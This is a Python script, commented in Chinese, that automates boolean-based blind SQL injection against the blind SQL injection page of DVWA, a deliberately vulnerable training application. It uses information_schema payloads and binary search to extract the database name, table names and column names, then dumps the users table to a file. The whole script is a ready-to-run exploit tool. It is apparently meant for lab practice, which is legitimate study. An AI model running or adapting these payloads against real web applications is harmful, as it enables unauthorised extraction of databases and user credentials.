import requests
import time
import sys
from urllib.parse import quote
from tqdm import tqdm  # 需要安装: pip install tqdm

# DVWA布尔盲注利用类
class DVWABlindSQLInjector:
    # 初始化注入器
    def __init__(self, url, cookie, delay=0.5):
        self.url = url
        self.session = requests.Session()
        self.delay = delay
        # 解析cookie字符串为字典
        self.cookies = self._parse_cookie(cookie)

        # 判断页面正常的特征
        self.true_pattern = "User ID exists in the database."
        self.false_pattern = "User ID is MISSING from the database."
    
    # 将cookie字符串转换为字典
    def _parse_cookie(self, cookie_str):
        cookies = {}
        for item in cookie_str.split('; '):
            if '=' in item:
                key, value = item.split('=', 1)
                cookies[key] = value
        return cookies
    
    # 发送Payload并判断页面状态
    def send_payload(self, payload):
        params = {'id': payload, 'Submit': 'Submit'}
    
        try:
            response = self.session.get(
                self.url, 
                params=params,
                cookies=self.cookies,
                timeout=10
            )
        
            time.sleep(self.delay)
            html = response.text
        
            # 判断逻辑
            if 'User ID exists in the database.' in html:
                return True
            elif 'User ID is MISSING from the database.' in html:
                return False
            else:
                # 调试：看看实际返回了什么
                print(f"[!] Payload: {payload}")
                print(f"[!] 响应片段: {html[200:400]}")
                return None
            
        except Exception as e:
            print(f"[!] 请求异常: {e}")
            return None

class AdvancedBlindInjector(DVWABlindSQLInjector):
    # 带进度条的数据库名获取
    def get_database_name_with_progress(self):
        db_length = self.get_string_length("database()", "数据库名")
        
        if not db_length:
            return None
        
        db_name = ""
        query_template = "1' and ascii(substring(database(),{position},1))>{ascii} -- -"
        
        # 使用进度条
        with tqdm(total=db_length, desc="猜解数据库名", unit="char") as pbar:
            for pos in range(1, db_length + 1):
                char = self.binary_search_char(query_template, pos)
                if char:
                    db_name += char
                else:
                    db_name += '?'
                pbar.update(1)
                pbar.set_postfix({"当前": db_name})
        
        return db_name
    
    # 二分法猜解单个字符
    def binary_search_char(self, query_template, position, char_set="abcdefghijklmnopqrstuvwxyz0123456789_-,.@ "):
        ''' 
        参数：
            query_template: 查询模板，需要包含{position}和{ascii}占位符
            position: 字符位置(从1开始)
            char_set: 字符集,用于优化二分查找
        返回：
            猜解到的字符，失败返回None
    ''' 
    # 将字符集转化为ASCII值并排序
        ascii_values = sorted([ord(c) for c in char_set])
        low = 0
        high = len(ascii_values) - 1
        target_ascii = None
    
        while low <= high:
            mid = (low + high) // 2
            mid_ascii = ascii_values[mid]
        
            # 构造大于判断的请求
            payload_gt = query_template.format(
                position=position,
                ascii=mid_ascii
            )
            print(f"[*]测试位置:{position}, ASCII > {mid_ascii}({chr(mid_ascii)})?")
        
        # 发送大于判断的请求
            result_gt = self.send_payload(payload_gt)
        
            if result_gt is None:  # 请求失败
                return None
            
            if result_gt:  # 如果大于成立，说明字符 > mid_ascii
                low = mid + 1
            else:  # 如果大于不成立，说明字符 <= mid_ascii
                # 测试是否等于 mid_ascii
                payload_eq = query_template.replace(">{ascii}", "={ascii}").format(
                    position=position,
                    ascii=mid_ascii
                )
                print(f"[*]测试位置:{position}, ASCII = {mid_ascii}({chr(mid_ascii)})?")
            
                result_eq = self.send_payload(payload_eq)
            
                if result_eq:  # 如果等于成立，找到目标字符
                    target_ascii = mid_ascii
                    break
                else:  # 如果不等于，说明字符 < mid_ascii
                    high = mid - 1
    
        if target_ascii:
            print(f"[√]位置{position}字符: {chr(target_ascii)}")
            return chr(target_ascii)
        else:
            print(f"[×]位置{position}猜解失败")
            return None
    
    # 获取数据库名
    def get_database_name(self):
        print("\n[*]开始猜解数据库名")
    
        # 先测试注入是否有效
        test_payload = "1' and 1=1 -- -"
        if not self.send_payload(test_payload):
            print("[!] 注入测试失败，检查注入点")
            return None
    
        # 获取数据库名长度
        db_length = self.get_string_length("database()", "数据库名")
        if not db_length:
            print("[!]无法获取数据库长度")
            return None
    
        print(f"[+]数据库长度:{db_length}")
    
        # 逐字符猜解
        db_name = ""
        query_template = "1' and ascii(substring(database(),{position},1))>{ascii} -- -"
    
        for pos in range(1, db_length + 1):
            print(f"\n[*]猜解第{pos}个字符...")
            char = self.binary_search_char(query_template, pos)
            if char:
                db_name += char
                print(f"[+]当前数据库名: {db_name}")
            else:
                print(f"[!]位置{pos}猜解失败")
                break
    
        print(f"\n[✓]数据库名: {db_name}")
        return db_name
    
    # 获取字符串长度
    def get_string_length(self, expression, description):
        '''
            参数：
            expression:要获取长度的表达式(如database())
            description:描述信息(用于打印)
        '''
        print(f"[*]正在获取{description}长度...")
        # 使用二分法猜解长度
        low, high = 1, 50  # 假设长度不超过50
        while low <= high:
            mid = (low + high) // 2
            payload = f"1' and length({expression})>{mid} -- -"
            print(f"    [*]测试长度 > {mid}?")
            result = self.send_payload(payload)
            if result:
                low = mid + 1
            else:
                payload_eq = f"1' and length({expression})={mid} -- -"
                print(f"    [*]测试长度 = {mid}?")
                if self.send_payload(payload_eq):
                    print(f"    [✓]找到长度: {mid}")
                    return mid
                high = mid - 1
        print(f"    [✗]未找到长度，返回默认值1")
        return 1
    
    # 获取表名 - 修复版本
    def get_tables(self, db_name):
        print(f"\n[*]开始获取数据库'{db_name}'的表名")
        # 先获取表的数量 - 修复语法
        table_count = self.get_number_value(
            f"(select count(*) from information_schema.tables where table_schema=database())",
            "表数量"
        )
        
        if not table_count:
            print("[!]无法获取表数量")
            return []
            
        print(f"[+]共有{table_count}张表")
        tables = []
        
        for i in range(table_count):
            print(f"\n[*]正在获取第{i+1}张表名...")
            
            # 获取表名长度 - 修复limit语法
            table_name_length = self.get_number_value(
                f"(select length(table_name) from information_schema.tables where table_schema=database() limit {i},1)",
                f"第{i+1}张表名长度"
            )
            
            if not table_name_length:
                print(f"[!]无法获取第{i+1}张表名长度，跳过")
                continue
                
            print(f"[+]第{i+1}张表名长度: {table_name_length}")
            
            # 逐字符猜解表名
            table_name = ""
            query_template = (
                f"1' and ascii(substring((select table_name from information_schema.tables "
                f"where table_schema=database() limit {i},1),{{position}},1))>{{ascii}} -- -"
            )
            
            success = True
            for pos in range(1, table_name_length + 1):
                print(f"\n[*]猜解第{i+1}张表第{pos}个字符...")
                char = self.binary_search_char(query_template, pos)
                if char:
                    table_name += char
                    print(f"[+]当前表名: {table_name}")
                else:
                    print(f"[!]第{pos}个字符猜解失败")
                    success = False
                    break
            
            if success and table_name:
                tables.append(table_name)
                print(f"[+] 第 {i+1} 张表: {table_name}")
            else:
                print(f"[!]第{i+1}张表名猜解失败")
        
        return tables
    
    # 新增：获取数值的辅助方法
    def get_number_value(self, expression, description):
        """获取数值型结果"""
        print(f"[*]正在获取{description}...")
        
        # 使用二分法猜解数值
        low, high = 1, 20  # 假设不超过20
        found = False
        
        # 先确定上限
        while not found:
            payload = f"1' and {expression} > {high} -- -"
            if self.send_payload(payload):
                high *= 2
                if high > 100:  # 设置最大限制
                    break
            else:
                found = True
        
        # 二分查找精确值
        low = 1
        while low <= high:
            mid = (low + high) // 2
            
            # 测试是否等于mid
            payload_eq = f"1' and {expression} = {mid} -- -"
            if self.send_payload(payload_eq):
                print(f"    [✓]找到值: {mid}")
                return mid
            
            # 测试是否大于mid
            payload_gt = f"1' and {expression} > {mid} -- -"
            if self.send_payload(payload_gt):
                low = mid + 1
            else:
                high = mid - 1
        
        return None
    
    # 获取列名和数据
    def get_columns(self, db_name, table_name):
        print(f"\n[*] 开始获取表 '{table_name}' 的列名...")
        # 获取列数量
        column_count = self.get_number_value(
            f"(select count(*) from information_schema.columns where table_schema=database() and table_name='{table_name}')",
            "列数量"
        )
            
        if not column_count:
            print("[!] 无法获取列数量")
            return []
            
        print(f"[+] 共有 {column_count} 列")
            
        columns = []
        for i in range(column_count):
            print(f"\n[*] 正在获取第 {i+1} 列名...")
                
            # 获取列名长度
            column_name_length = self.get_number_value(
                f"(select length(column_name) from information_schema.columns where table_schema=database() and table_name='{table_name}' limit {i},1)",
                f"第{i+1}列名长度"
            )
                
            if not column_name_length:
                continue
                
            # 逐字符猜解列名
            column_name = ""
            query_template = (
                f"1' and ascii(substring((select column_name from information_schema.columns "
                f"where table_schema=database() and table_name='{table_name}' limit {i},1),{{position}},1))>{{ascii}} -- -"
            )
                
            for pos in range(1, column_name_length + 1):
                char = self.binary_search_char(query_template, pos)
                if char:
                    column_name += char
                else:
                    break
                
            columns.append(column_name)
            print(f"[+] 第 {i+1} 列: {column_name}")
            
        return columns
    
    # 导出表中数据    
    def dump_table(self, db_name, table_name, columns):
        print(f"\n[*] 开始导出表 '{table_name}' 的数据...")
            
        # 获取数据行数
        row_count = self.get_number_value(
            f"(select count(*) from {table_name})",
            "数据行数"
        )
            
        if not row_count:
            print("[!] 无法获取数据行数")
            return
            
        print(f"[+] 共有 {row_count} 行数据")
            
        data = []
        for row in range(row_count):
            row_data = {}
            print(f"\n[*] 正在获取第 {row+1} 行数据...")
                
            for col in columns:
                # 获取该字段的数据长度
                col_data_length = self.get_number_value(
                    f"(select length(cast({col} as char)) from {table_name} limit {row},1)",
                    f"字段 {col} 长度"
                )
                    
                if not col_data_length:
                    continue
                    
                # 逐字符猜解数据
                col_data = ""
                query_template = (
                    f"1' and ascii(substring((select {col} from {table_name} limit {row},1),{{position}},1))>{{ascii}} -- -"
                )
                    
                for pos in range(1, col_data_length + 1):
                    char = self.binary_search_char(query_template, pos)
                    if char:
                        col_data += char
                    else:
                        break
                    
                row_data[col] = col_data
                print(f"    [*] {col}: {col_data}")
                
            data.append(row_data)
            
        return data


# 主函数
def main():
    
    # 配置信息
    TARGET_URL = "http://你的靶场IP/dvwa/vulnerabilities/sqli_blind/" 
    COOKIE = "PHPSESSID=你的会话ID; security=low" 
    
    print("="*60)
    print("DVWA 布尔盲注自动化利用脚本")
    print("="*60)
    
    # 创建注入器实例 - 直接使用AdvancedBlindInjector
    injector = AdvancedBlindInjector(TARGET_URL, COOKIE, delay=0.3)
    
    # 测试连接
    print("\n[*] 测试目标连接...")
    test_result = injector.send_payload("1")
    if test_result is not None:
        print("[✓] 目标连接成功")
    else:
        print("[✗] 目标连接失败，请检查URL和Cookie")
        return
    
    # 获取数据库名
    db_name = injector.get_database_name()
    if not db_name:
        print("[!] 获取数据库名失败")
        return
    
    # 获取表名
    tables = injector.get_tables(db_name)
    if not tables:
        print("[!] 获取表名失败")
        return
    
    # 如果发现users表，自动导出数据
    if 'users' in tables:
        print("\n[*] 发现users表，开始导出数据...")
        columns = injector.get_columns(db_name, 'users')
        if columns:
            data = injector.dump_table(db_name, 'users', columns)
            
            # 保存结果到文件
            with open('dump_result.txt', 'w', encoding='utf-8') as f:
                f.write("=== 数据导出结果 ===\n")
                for row in data:
                    f.write(str(row) + '\n')
            print(f"\n[✓] 数据已保存到 dump_result.txt")
    
    print("\n[✓] 脚本执行完成")

if __name__ == "__main__":

    main()
